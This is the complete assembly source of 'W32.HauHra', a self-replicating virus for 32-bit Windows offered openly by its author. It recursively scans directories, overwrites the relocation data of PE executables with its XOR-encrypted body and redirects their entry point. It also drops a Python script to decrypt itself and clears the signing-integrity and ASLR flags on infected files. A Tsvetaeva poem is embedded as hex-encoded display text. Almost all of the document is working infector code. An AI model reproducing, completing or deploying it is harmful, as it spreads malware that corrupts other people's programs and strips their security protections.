comment °

W32.HauHra by hh86

- direct action file infector of PE32 exe files
- [new] scan all subdirectories for files to infect
- [new] simple encryption, but uses Python code to decrypt itself!
- overwrites reloc data with the virus body
- infects files with ANSI/Unicode names
- uses CRC32 instead of API names for smaller code (but find is not alphabetically)

this Viper updated with self-replication capabilities
this is just a demo from a larger project, not entirely finished yet

°

.386
.model  flat, stdcall
include hauhra.inc

.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx 
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

code_begin      label    near
        mov     esi, offset infect_begin
        mov     ecx, offset infect_end - offset infect_begin

DECRYPT_STRKEY  equ "8", "6"
DECRYPT_KEY     equ 86
crypt_loop      label    near
        xor     byte ptr [esi], DECRYPT_KEY
        inc     esi
        loop    crypt_loop
        push    offset link_text
        push    dword ptr fs:[0]
        mov     dword ptr fs:[0], esp

;-------------------------------------------------------------------------------
;here begins the code in infected files
;-------------------------------------------------------------------------------

hauhra_begin    label    near
        push    dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp], "hh86"

hostpatch       label    near
        pushad
        call    init_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret

init_seh        label    near
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]

;-------------------------------------------------------------------------------
;initialize kernel32 API
;-------------------------------------------------------------------------------

        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      0553b5c78h                   ;CreateFileA
        dd      040cf273dh                   ;CreateFileMappingW
        dd      0a1efe929h                   ;CreateFileW
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
;       dd      05b4219f8h                   ;GetTickCount
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      0a89b382fh                   ;MapViewOfFile
        dd      09d6231ceh                   ;SetCurrentDirectoryW
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0391ab6afh                   ;UnmapViewOfFile
        dd      0cce95612h                   ;WriteFile   
        dd      03fc1bd8dh                   ;LoadLibraryA (SP-O)     
        db      0

;-------------------------------------------------------------------------------
;initialize python24 API
;-------------------------------------------------------------------------------

        pop     eax
        push    ecx
        push    "42no"
        push    "htyp"
        push    esp
        call    eax
        xchg    eax, ebp
        call    walk_dll
        dd      0944b331eh                   ;PyEval_CallObject
        dd      0e1a9b626h                   ;PyImport_ImportModule
        dd      0d8e7b807h                   ;PyList_New
;       dd      0a2bc1dffh                   ;PyList_GetItem
;       dd      0312da522h                   ;PyList_SetItem
        dd      01826ee15h                   ;PyLong_AsLong
        dd      0520fa7d1h                   ;PyLong_FromUnsignedLong
        dd      009e730b4h                   ;PyObject_GetAttrString
        dd      0cd320fc6h                   ;Py_DecRef
        dd      00d000209h                   ;Py_Finalize
        dd      07e63e213h                   ;Py_BuildValue
        dd      020816650h                   ;Py_Initialize (SP-O)
        db      0

;-------------------------------------------------------------------------------
;drop decryptor
;-------------------------------------------------------------------------------

        mov     ebp, esp
        push    ecx
        push    ecx
        push    CREATE_ALWAYS
        push    ecx
        push    3
        push    3
        call    skip_pyscript

DECRYPTOR_NAME  equ "O"
script_name     label    near
        db      DECRYPTOR_NAME, ".py", 0

script_begin    label    near
        db      "def ", DECRYPTOR_NAME, "(l):", 13, 10
        db      "    for i in range(len(l)):", 13, 10

script_decrypt  label    near
        db      "        l[i] = l[i] ^ ", DECRYPT_STRKEY, 13, 10

script_return   label    near
        db      "    return l;"

script_end      label    near

skip_pyscript   label    near
        pop     edi
        push    edi
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kCreateFileA]
        inc     eax
        jz      exit_code
        push    eax
        xor     ebx, ebx
        push    ebx
        push    esp
        push    "h"
        org     $ - 1
        db      offset script_end - offset script_begin
        scas    dword ptr [edi]
        inc     edi
        push    edi
        push    eax
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kWriteFile]
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kCloseHandle]

;-------------------------------------------------------------------------------
;import script module and get function
;-------------------------------------------------------------------------------

        call    dword ptr [esp]              ;initialize
        push    DECRYPTOR_NAME
        push    esp
        call    dword ptr [ebp + python24.PyImport_ImportModule]
        test    eax, eax
        jz      py_release
        xchg    edi, eax
        push    edi
        call    dword ptr [ebp + python24.PyObject_GetAttrString]
        test    eax, eax
        jz      imp_release
        xchg    esi, eax

;-------------------------------------------------------------------------------
;create list
;-------------------------------------------------------------------------------

        push    offset infect_end - offset infect_begin
        call    dword ptr [ebp + python24.PyList_New]
        test    eax, eax
        jz      fun_release
        xchg    ebx, eax
        pushad
        xchg    edi, eax
        push    esi
        call    skip_data

;-------------------------------------------------------------------------------
;here begins the self-replication code
;-------------------------------------------------------------------------------

infect_begin    label    near
        push    sizeof level_data * MAX_LEVELS + sizeof WIN32_FIND_DATA * 2
        push    GMEM_ZEROINIT
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kGlobalAlloc]
        xchg    edi, eax
        lea     esi, dword ptr [edi + sizeof level_data * MAX_LEVELS]
        xor     ebx, ebx

find_files      label    near
        push    "*"
        mov     ecx, esp
        push    esi
        push    ecx
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kFindFirstFileW]
        scas    dword ptr [edi]              ;sizeof level_data
        mov     dword ptr [edi], eax
        pop     ecx
        inc     eax
        jz      level_check

find_loop       label    near
        lea     eax, dword ptr [esi + WIN32_FIND_DATA.cFileName]
        cmp     byte ptr [eax], "."
        je      skip_level
        test    byte ptr [esi], FILE_ATTRIBUTE_DIRECTORY
        je      map_file
        push    eax
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kSetCurrentDirectoryW]
        dec     eax
        jz      find_files
        
        ;maybe tomorrow we will embrace this chance

skip_level      label    near
        push    esi
        push    dword ptr [edi + level_data.findhandler]
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kFindNextFileW]
        test    eax, eax
        jnz     find_loop
        push    dword ptr [edi + level_data.findhandler]
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kFindClose]

level_check     label    near
        sub     edi, sizeof level_data
        cmp     dword ptr [edi], ebx
        je      free_mem
        push    ebx
        push    2e002eh
        push    esp
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kSetCurrentDirectoryW]
        pop     eax
        pop     eax
        jmp     skip_level

;-------------------------------------------------------------------------------
;change object attributes to archive, create a map view if possible
;-------------------------------------------------------------------------------

map_file        label     near
        push    dword ptr [esi]
        push    eax
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    eax
        push    FILE_ATTRIBUTE_ARCHIVE
        push    eax
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kSetFileAttributesW]
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kCreateFileW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kMapViewOfFile]
        push    eax
        pushad
        call    infect_exe

delta_unmap     label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kUnmapViewOfFile]
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kCloseHandle]
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kCloseHandle]
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kSetFileAttributesW]
        jmp     skip_level

;-------------------------------------------------------------------------------
;free find memory buffer
;-------------------------------------------------------------------------------

free_mem        label    near
        push    edi
        call    dword ptr [ebp + sizeof python24 + 0ch + kernel32.kGlobalFree]

;-------------------------------------------------------------------------------
;common exit point
;-------------------------------------------------------------------------------

breakpoint      label    near
        int     3

;-------------------------------------------------------------------------------
;parse file struct
;signatures must match those of PE files
;-------------------------------------------------------------------------------

infect_exe      proc     near
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     breakpoint
        push    eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], "EP"
        jne     breakpoint

;-------------------------------------------------------------------------------
;32-bit machine
;discard DLL files (because they do not have own PEB) and system files
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_I386
        jne     breakpoint
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Characteristics]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        jz      breakpoint
        test    ch, high (IMAGE_FILE_DLL or IMAGE_FILE_SYSTEM)
        jnz     breakpoint

;-------------------------------------------------------------------------------
;before check size of optional header make sure optional header is PE32
;IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Magic], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     breakpoint

;-------------------------------------------------------------------------------
;SizeOfOptionalHeader must indicate that it covers at least until debug fields entries
;-------------------------------------------------------------------------------

        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_RELOC_TABLE - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
        jnae    breakpoint
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
        jnae    skip_ldcchk
        cmp     dword ptr [eax + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE], ebx
        jne     breakpoint

skip_ldcchk     label    near

;-------------------------------------------------------------------------------
;Windows CUI/GUI subsystem file only
;-------------------------------------------------------------------------------

        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem]
        dec     ecx
        dec     ecx
        jz      find_relocs
        dec     ecx
        jnz     breakpoint
        
;-------------------------------------------------------------------------------
;find the reloc table
;-------------------------------------------------------------------------------

find_relocs     label    near
        imul    cx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections], sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + edx + IMAGE_NT_HEADERS.OptionalHeader.Magic + IMAGE_SECTION_HEADER.VirtualAddress]
        add     esi, ecx
        mov     bl, IMAGE_DIRECTORY_ENTRY_RELOC_TABLE
        add     ebx, eax
        mov     ecx, dword ptr [ebx]
        jecxz   breakpoint
        cmp     dword ptr [ebx + 4], offset hauhra_end - offset hauhra_begin
        jb      breakpoint

section_loop    label    near
        sub     esi, sizeof IMAGE_SECTION_HEADER
        cmp     dword ptr [esi], ecx
        jnbe    section_loop
        mov     edi, ecx
        sub     edi, dword ptr [esi]
        add     edi, dword ptr [esi + IMAGE_SECTION_HEADER.PointerToRawData - IMAGE_SECTION_HEADER.VirtualAddress]
        pop     edx
        add     edi, edx
        
;-------------------------------------------------------------------------------
;clear *_NX_COMPAT above, then might not need IMAGE_SCN_MEM_EXECUTE in section flags
;-------------------------------------------------------------------------------

        or      byte ptr [esi + (IMAGE_SECTION_HEADER.Characteristics - IMAGE_SECTION_HEADER.VirtualAddress) + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

;-------------------------------------------------------------------------------
;copy and encrypt code
;-------------------------------------------------------------------------------

        mov     esi, dword ptr [esp + sehmap.ExceptionRegistrationRecord.Handler]
        sub     esi, offset delta_unmap - offset hauhra_begin
        push    ecx
        mov     ecx, offset hauhra_end - offset hauhra_begin
        rep     movs byte ptr [edi], byte ptr [esi]
        sub     edi, offset hauhra_end - offset infect_begin
        mov     cx, offset infect_end - offset infect_begin

encrypt_code    label    near
        xor     byte ptr [edi], DECRYPT_KEY
        inc     edi
        loop    encrypt_code

;-------------------------------------------------------------------------------
;clear *_NO_SEH to enable SEH, and *_FORCE_INTEGRITY to infect files signed files
;clear *_DYNAMIC_BASE to disable ASLR
;-------------------------------------------------------------------------------

        and     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics], not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY or IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)

;-------------------------------------------------------------------------------
;clear base relocations data directory entries
;-------------------------------------------------------------------------------

        bts     dword ptr [eax + IMAGE_NT_HEADERS.FileHeader.Characteristics], ecx
        mov     dword ptr [ebx], ecx
        mov     dword ptr [ebx + 4], ecx

;-------------------------------------------------------------------------------
;alter entrypoint 
;-------------------------------------------------------------------------------

        pop     ecx
        xchg    dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], ecx
        mov     dword ptr [edi - ((offset infect_end - offset hostpatch) + 4)], ecx
        int     3
infect_exe      endp

infect_end      label    near

skip_data       label    near
        pop     esi

;-------------------------------------------------------------------------------
;make every byte of code an item
;-------------------------------------------------------------------------------

set_listitems   label    near
        xor     eax, eax
        lods    byte ptr [esi]
        push    eax
        call    dword ptr [ebp + python24.PyLong_FromUnsignedLong]
        pop     edx                          ;do discard here
        mov     edx, dword ptr [ebx + pylist_object.ob_item]
        mov     dword ptr [edx + edi * 4], eax
        inc     edi
        cmp     di,  offset infect_end - offset infect_begin
        jne     set_listitems
        xchg    eax, esi
        pop     esi
        push    eax
       
;-------------------------------------------------------------------------------
;build list object for argument and call function
;-------------------------------------------------------------------------------

        push    ")O("
        mov     ecx, esp
        push    ebx
        push    ecx
        call    dword ptr [ebp + python24.Py_BuildValue]
        push    eax
        push    esi
        call    dword ptr [ebp + python24.PyEval_CallObject]
        add     esp, 14h
        pop     esi
        dec     edi

;-------------------------------------------------------------------------------
;copy decrypted code from list
;-------------------------------------------------------------------------------

get_listitems   label    near
        mov     eax, dword ptr [ebx + pylist_object.ob_item]
        push    dword ptr [eax + edi * 4]
        call    dword ptr [ebp + python24.PyLong_AsLong]
        pop     ecx
        dec     esi
        mov     byte ptr [esi], al
        dec     edi
        jns     get_listitems
        popad
        push    ebx
        call    dword ptr [ebp + python24.Py_DecRef]

fun_release     label    near
        push    esi
        call    dword ptr [ebp + python24.Py_DecRef]

imp_release     label    near
        push    edi
        call    dword ptr [ebp + python24.Py_DecRef]

py_release      label    near
        call    dword ptr [ebp + python24.Py_Finalize]
        test    ebx, ebx
        jnz     infect_begin

exit_code       label    near
        int     3

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]

reset_index     label    near
        xor     edx, edx

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        je      resolve_addr
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     walk_names
        int     3

resolve_addr    label    near
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     reset_index
        inc     esi
        jmp     esi

hauhra_end      label    near

end     code_begin

----
24/11/14